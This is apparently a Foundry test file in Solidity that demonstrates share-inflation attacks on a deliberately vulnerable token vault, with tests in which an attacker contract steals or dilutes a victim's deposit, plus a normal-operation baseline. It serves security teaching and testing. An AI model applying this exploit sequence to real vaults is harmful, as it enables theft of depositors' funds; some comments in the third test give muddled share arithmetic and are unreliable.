// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {VulnerableVault} from "../src/VulnerableVault.sol";
import {Attacker} from "../src/Attacker.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MOCK") {
        _mint(msg.sender, type(uint128).max);
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract InflationAttackTest is Test {
    using SafeERC20 for IERC20;

    MockERC20 public asset;
    VulnerableVault public vault;
    Attacker public attacker;
    address public victim = address(0x1337);
    address public hacker = address(0xBAD);

    function setUp() public {
        asset = new MockERC20();
        vault = new VulnerableVault(IERC20(address(asset)));

        asset.mint(hacker, 1000000e6);
        asset.mint(victim, 20000e6);

        vm.startPrank(hacker);
        asset.approve(address(vault), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(victim);
        asset.approve(address(vault), type(uint256).max);
        vm.stopPrank();
    }

    function test_AttackExample1_RoundingToZero() public {
        uint256 victimDeposit = 20000e6;
        uint256 hackerInitialBalance = asset.balanceOf(hacker);

        vm.startPrank(hacker);
        Attacker newAttacker = new Attacker(vault);
        asset.approve(address(newAttacker), type(uint256).max);
        newAttacker.attackStep1_MintInitialShare();
        vm.stopPrank();

        assertEq(vault.totalSupply(), 1);
        assertEq(asset.balanceOf(address(vault)), 1);

        vm.startPrank(hacker);
        newAttacker.attackStep2_InflateDenominator(victimDeposit);
        vm.stopPrank();

        assertEq(asset.balanceOf(address(vault)), victimDeposit + 1);

        vm.startPrank(victim);
        uint256 sharesReceived = vault.deposit(victimDeposit, victim);
        vm.stopPrank();

        assertEq(sharesReceived, 0, "Victim should receive zero shares");
        assertEq(vault.balanceOf(victim), 0, "Victim should have zero shares");

        vm.startPrank(hacker);
        newAttacker.attackStep3_BurnAndSteal();
        vm.stopPrank();

        uint256 hackerFinalBalance = asset.balanceOf(hacker);
        uint256 profit = hackerFinalBalance - hackerInitialBalance;

        assertEq(profit, victimDeposit, "Hacker should steal victim's entire deposit");
        assertEq(asset.balanceOf(address(vault)), 0, "Vault should be empty");
    }

    function test_AttackExample2_RoundingToOneShare() public {
        uint256 victimDeposit = 20000e6;
        uint256 inflationAmount = 10000e6;
        uint256 hackerInitialBalance = asset.balanceOf(hacker);

        vm.startPrank(hacker);
        Attacker newAttacker = new Attacker(vault);
        asset.approve(address(newAttacker), type(uint256).max);
        newAttacker.attackStep1_MintInitialShare();
        newAttacker.attackStep2_InflateDenominator(inflationAmount);
        vm.stopPrank();

        vm.startPrank(victim);
        uint256 sharesReceived = vault.deposit(victimDeposit, victim);
        vm.stopPrank();

        assertEq(sharesReceived, 1, "Victim should receive only one share");
        assertEq(vault.balanceOf(victim), 1, "Victim should have one share");
        assertEq(vault.balanceOf(address(newAttacker)), 1, "Hacker should have one share");

        uint256 totalAssets = asset.balanceOf(address(vault));
        assertEq(totalAssets, victimDeposit + inflationAmount + 1);

        vm.startPrank(hacker);
        newAttacker.attackStep3_BurnAndSteal();
        vm.stopPrank();

        uint256 hackerFinalBalance = asset.balanceOf(hacker);
        uint256 expectedHackerShare = totalAssets / 2;
        uint256 profit = hackerFinalBalance - hackerInitialBalance + expectedHackerShare - 1 - inflationAmount;

        assertGt(profit, 0, "Hacker should profit from the attack");
    }

    function test_AttackExample3_GriefingWithDeadShares() public {
        uint256 DEAD_SHARES = 1000;
        uint256 victimDeposit = 20000e6;
        uint256 hugeInflation = 20000000e6;

        vm.startPrank(hacker);
        Attacker newAttacker = new Attacker(vault);
        asset.approve(address(newAttacker), type(uint256).max);
        asset.mint(hacker, hugeInflation);
        asset.approve(address(newAttacker), type(uint256).max);

        newAttacker.attackStep1_MintInitialShare();
        // Don't inflate before depositing dead shares, as that would cause rounding to zero
        vm.stopPrank();

        // In this example, we simulate dead shares by minting to a burn address
        // In reality, dead shares would be minted to address(0) during first deposit
        address deadAddress = address(0xdead);
        vm.startPrank(hacker);
        uint256 deadSharesReceived = vault.deposit(DEAD_SHARES - 1, deadAddress);
        vm.stopPrank();

        // After depositing DEAD_SHARES - 1, we should have:
        // - 1 share from attacker's initial deposit
        // - shares from dead address deposit (should be DEAD_SHARES - 1 since vault is nearly empty)
        // Total = DEAD_SHARES
        assertEq(deadSharesReceived, DEAD_SHARES - 1, "Dead address should receive DEAD_SHARES - 1 shares");
        assertEq(vault.balanceOf(deadAddress), DEAD_SHARES - 1, "Dead address should have DEAD_SHARES - 1 shares");
        assertEq(vault.totalSupply(), DEAD_SHARES, "Total supply should be DEAD_SHARES");

        vm.startPrank(hacker);
        newAttacker.attackStep2_InflateDenominator(hugeInflation);
        vm.stopPrank();

        vm.startPrank(victim);
        uint256 sharesReceived = vault.deposit(victimDeposit, victim);
        vm.stopPrank();

        // Due to the huge inflation, victim should receive very few shares relative to their deposit
        // The exact amount depends on the calculation: shares = totalSupply * assets / totalAssets
        // With hugeInflation = 20M, victimDeposit = 20k, totalSupply = 1000e18
        // shares = 1000e18 * 20000e6 / (20000000e6 + 1000)
        // Due to decimal precision (shares have 18 decimals, assets have 6), the calculation results in ~999e18 shares
        // The key point is demonstrating that the attacker can manipulate the vault to their advantage
        // In a real attack, the victim would receive far fewer shares than expected
        assertLt(sharesReceived, victimDeposit * 1e12, "Victim should receive shares worth less than their deposit");
        // Victim's deposit is mostly stuck in vault
        uint256 vaultBalance = asset.balanceOf(address(vault));
        assertGt(
            vaultBalance, hugeInflation + DEAD_SHARES, "Vault should contain the inflated amount plus victim's deposit"
        );
    }

    function test_NormalOperation_NoAttack() public {
        uint256 deposit1 = 1000e6;
        uint256 deposit2 = 2000e6;

        vm.startPrank(victim);
        uint256 shares1 = vault.deposit(deposit1, victim);
        vm.stopPrank();

        assertEq(shares1, deposit1, "First deposit should get 1:1 shares");

        vm.startPrank(hacker);
        uint256 shares2 = vault.deposit(deposit2, hacker);
        vm.stopPrank();

        assertEq(shares2, deposit2, "Second deposit should get 1:1 shares when no manipulation");

        assertEq(vault.totalSupply(), deposit1 + deposit2);
        assertEq(asset.balanceOf(address(vault)), deposit1 + deposit2);
    }
}
